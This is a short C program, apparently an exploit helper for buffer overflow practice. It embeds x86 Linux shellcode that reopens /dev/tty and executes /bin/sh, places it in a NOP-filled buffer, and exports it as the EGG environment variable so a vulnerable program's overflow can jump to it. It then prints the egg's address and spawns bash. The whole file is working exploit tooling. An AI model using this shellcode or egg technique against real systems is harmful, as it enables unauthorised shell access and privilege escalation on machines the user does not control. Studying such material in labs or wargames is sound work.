#include <stdlib.h>
#include <string.h>
#include <stdio.h>

char code[] =  "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53"
		"\x68/tty\x68/dev\x89\xe3\x31\xc9\x66"
		"\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0"
		"\x50\x68//sh\x68/bin\x89\xe3\x50\x53"
		"\x89\xe1\x99\xb0\x0b\xcd\x80";

int main() {

    /* Print addr of egg if exists */
    char* egg;
    if (egg = getenv("EGG")) {
        printf("Egg is at addr 0x%x\n", egg);
        return 0;
    }

    /* Declare buffer to hold nop sled and egg */
    size_t buf_size = strlen(code); // strlen(code) == no sled
    char buf[buf_size];

    /* Fill with nops */
    memset(buf, 0x90, buf_size);

    /* Place shellcode at the end of buf */
    memcpy(&buf[buf_size-strlen(code)], code, strlen(code));

    /* Assign and place the variable in the environment, and overwrite if exists */
    setenv("EGG", buf, 1);

    /* Spwan a shell with the above modified env */
    system("bash");

    return 0;
}